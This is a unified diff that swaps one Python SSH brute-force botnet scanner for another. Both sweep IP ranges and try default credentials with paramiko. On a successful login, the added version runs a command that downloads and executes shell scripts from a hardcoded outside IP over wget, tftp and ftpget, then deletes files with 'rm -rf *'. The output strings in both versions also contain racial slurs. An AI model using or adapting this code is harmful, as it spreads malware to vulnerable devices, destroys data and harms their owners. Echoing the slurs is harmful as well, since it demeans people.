@@ -1,126 +1,163 @@
-#!/usr/bin/env python
-"""
-						Busybox Bang Bus v2
-			LiGhT dA BoSs yA DiG! nO CoDe RiPPrInG PlZ
-XORA IS A SKID, PROXY IS A SKID, ZONE IS A SKID, YOU ARE ALL SKIDZ!
-"""
+# Voids hacka scanna
+# nano /usr/include/bits/typesizes.h -> change 1024 to 99999
+# ulimit -n 99999 
+# python scan.py 1000 <start-range> <end-range>
 
-import threading, paramiko, random, socket, time, os, sys
+import threading, paramiko, random, socket, time, sys
 
-if not os.geteuid()==0:
-	sys.exit("\nGOTTA BE ROOT TO RIDE DA BANG BUS YA DIG\n")
+paramiko.util.log_to_file("/dev/null")
 
-os.system("clear")
-if len(sys.argv) < 3:
-	print "BuSyBoX BaNG BuS v2"
-	print "Usage: python "+sys.argv[0]+" [Start IP] [End IP] [0/1/2/perl/ubnt]"
-	sys.exit("Example: python "+sys.argv[0]+" 1.1.1.1 2.2.2.2 0\n")
 
-sys.stdout.write("\x1b]2;BuSyBoX BaNG BuS\x07")
-os.system("clear")
-os.system("echo -e 'ulimit -s 999999; ulimit -n 999999; ulimit -u 999999\n' > ~/.bashrc")
-os.system("ulimit -s 999999; ulimit -n 999999; ulimit -u 999999")
-paramiko.util.log_to_file("/dev/null") #quiets paramiko output
-os.system("sysctl -w fs.file-max=999999 >/dev/null")
+blacklisted = ["127.0","10.0","192.168"]
 
-passwords = [ # argv 0
-    "ubnt:ubnt",
-    "root:root",
-    "root:admin",
-    "admin:admin",
-    "root:1234",
-    "admin:1234",
-    "guest:guest",
-    "user:user",
-    "test:test",
-]
+passwords = ["admin:1234"]
 
-if sys.argv[3] == '1':
-	passwords = [ "root:root", "root:admin", "admin:admin", "ubnt:ubnt", "root:1234", "admin:1234", "guest:guest", "user:user", "test:test" ] #Slow but effective
-if sys.argv[3] == '2':
-	passwords = [ "root:root", "admin:admin", "ubnt:ubnt" ] #faster with decent execution
-if sys.argv[3] == 'perl':
-	passwords = [ "pi:raspberry", "vagrant:vagrant" ] #perl scanner
-if sys.argv[3] == 'ubnt':
-	passwords = [ "ubnt:ubnt" ] #only ubnt
+if sys.argv[4] == "root":
+    passwords = ["root:root"]
+if sys.argv[4] == "guest":
+    passwords = ["guest:guest"]
+if sys.argv[4] == "telnet":
 
-raw_input("Press <ENTER> to Enter the Bang Bus")
-credit = '# DO NOT SHARE THIS FUCKING SHIT' #throwback lulz
-print "\033[0m" + credit + "\033[0m"
+  if len(sys.argv) < 4 :
+    print("Usage: python " + sys.argv[0] + " <threads> <start-range> <end-range> <passwords>")
+    sys.exit()
+    
+print """\n\x1b[0;37m******************************
+*      \x1b[0;31mFinding Bots...\x1b[0;37m      *
+******************************\x1b[0m"""
 
-def ipRange(start_ip, end_ip):
-	start = list(map(int, start_ip.split(".")))
-	end = list(map(int, end_ip.split(".")))
-	temp = start
-	ip_range = []
+def sshscanner(ip):
+    global passwords
+    try:
+        thisipisbad='no'
+        for badip in blacklisted:
+            if badip in ip:
+                thisipisbad='yes'
+        if thisipisbad=='yes':
+            sys.exit()
+        username='root'
+        password="0"
+        port = 22
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+        s.connect((ip, port))
+        data = str(s.recv(1024))
+        if "SSH" in data:
+            print("\x1b[0;31m[-] SSH Open On -> " + ip + "\x1b[37m")
+        elif "ssh" in data:
+            print("\x1b[1;32m[-] SSH Open On -> " + ip + "\x1b[37m")
+        else:
+            sys.exit()
+        s.close()
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        dobreak=False
+        for passwd in passwords:
+            if ":n/a" in passwd:
+                password=""
+            else:
+                password=passwd.split(":")[1]
+            if "n/a:" in passwd:
+                username=""
+            else:
+                username=passwd.split(":")[0]
+            try:
+                ssh.connect(ip, port = port, username=username, password=password, timeout=3)
+                break
+            except:
+                pass
+        badserver=True
+        stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
+        output = stdout.read()
+        if "inet addr" in output:
+            badserver=False
+        websites = [ ]			
+        if badserver == False:
+                print("\x1b[0;36m[+] A Nigga Made It! -> " + ip + ":" + username + ":" + password + "\x1b[37m")
+                ssh.exec_command("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.122/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 50.115.166.122-c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 50.115.166.122; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 50.115.166.122 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *")
+                vulns = open("vuln.txt", "a").write(username + ":" + password + ":" + ip + "\n")
+                time.sleep(12)
+                ssh.close()
+    except Exception as e:
+        pass
 
-	ip_range.append(start_ip)
-	while temp != end:
-		start[3] += 1
-		for i in (3, 2, 1):
-			if temp[i] == 256:
-				temp[i] = 0
-				temp[i-1] += 1
-		ip_range.append(".".join(map(str, temp)))    
 
-	return ip_range
-class sshscanner(threading.Thread): # TAG: 1A
-	def __init__ (self, ip):
-		threading.Thread.__init__(self)
-		self.ip = str(ip)
-	global passwords
-	def run(self):
-		x = 1
-		while x != 0:
-			try:
-				username='root'
-				password="0"
-				port = 22
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				s.settimeout(3)
-				s.connect((self.ip, port))
-				s.close()
-				ssh = paramiko.SSHClient()
-				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-				dobreak=False
-				for passwd in passwords:
-					if ":n/a" in passwd:
-						password=""
-					else:
-						password=passwd.split(":")[1]
-					if "n/a:" in passwd:
-						username=""
-					else:
-						username=passwd.split(":")[0]
-					try:
-						ssh.connect(self.ip, port = port, username=username, password=password, timeout=5)
-						dobreak=True
-						break
-					except:
-						pass
-					if True == dobreak:
-						break
-				badserver=True
-				stdin, stdout, stderr = ssh.exec_command("echo nigger")
-				output = stdout.read()
-				if "nigger" in output:
-					badserver=False	
-				if badserver == False:
-					os.system("echo -e " +self.ip+ " >> .infected.ips")
-					os.system("echo -e " +username+ ":" +password+ ":" +self.ip+ " >> infection.log")
-					print "\033[32mBuSyBoXiNG -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m"
-					ssh.exec_command("command here")
-					time.sleep(3)
-					ssh.close()
-				if badserver == True:
-					ssh.close()
-			except:
-				pass
-			x = 0
-ip_range = ipRange("" +sys.argv[1], "" +sys.argv[2])
-for ip in ip_range:
-	try:				
-		t = sshscanner(ip)
-		t.start()
-	except:
-		pass # LiGhT yA DiG
+if sys.argv[2] == "LUCKY":
+    ranges = ["122.3.0.0/122.3.255.255", "122.52.0.0/122.54.255.255", "124.83.0.0/124.83.255.255", "124.105.0.0/124.107.255.255"]
+    randomrange = random.choice(ranges)
+    startrng = randomrange.split("/")[0]
+    endrng = randomrange.split("/")[1]
+
+if sys.argv[2] != "LUCKY":
+    a = int(sys.argv[2].split(".")[0])
+    b = int(sys.argv[2].split(".")[1])
+    c = int(sys.argv[2].split(".")[2])
+    d = int(sys.argv[2].split(".")[3])
+else:
+    a = int(startrng.split(".")[0])
+    b = int(startrng.split(".")[1])
+    c = int(startrng.split(".")[2])
+    d = int(startrng.split(".")[3])
+x = 0
+
+while(True):
+    try:
+
+        if sys.argv[2] != "LUCKY":
+            endaddr = sys.argv[3]
+        else:
+            endaddr = endrng
+        
+        d += 1
+
+        ipaddr = str(a) + "." + str(b) + "."+str(c)+"."+str(d)
+
+        if endaddr == (ipaddr or str(a) + "." + str(b) + "."+str(c)+"."+str(d-1)):
+            if sys.argv[2] == "LUCKY":
+                randomrange = random.choice(ranges)
+                startrng = randomrange.split("/")[0]
+                endrng = randomrange.split("/")[1]
+                a = int(startrng.split(".")[0])
+                b = int(startrng.split(".")[1])
+                c = int(startrng.split(".")[2])
+                d = int(startrng.split(".")[3])
+            else:
+                break
+
+        if d > 255:
+            c += 1
+            d = 0
+
+        if c > 255:
+            b += 1
+            c = 0
+        
+        if b > 255:
+            a += 1
+            b = 0
+
+        ipaddr = str(a) + "." + str(b) + "."+str(c)+"."+str(d)
+
+        if ipaddr == endaddr:
+            if sys.argv[2] == "LUCKY":
+                randomrange = random.choice(ranges)
+                startrng = randomrange.split("/")[0]
+                endrng = randomrange.split("/")[1]
+                a = int(startrng.split(".")[0])
+                b = int(startrng.split(".")[1])
+                c = int(startrng.split(".")[2])
+                d = int(startrng.split(".")[3])
+            else:
+                break
+
+        if x > 500:
+            time.sleep(1)
+            x = 0
+        
+        t = threading.Thread(target=sshscanner, args=(ipaddr,))
+        t.start()
+        
+    except Exception as e:
+        pass
+
+print "\x1b[37mDone\x1b[37m"
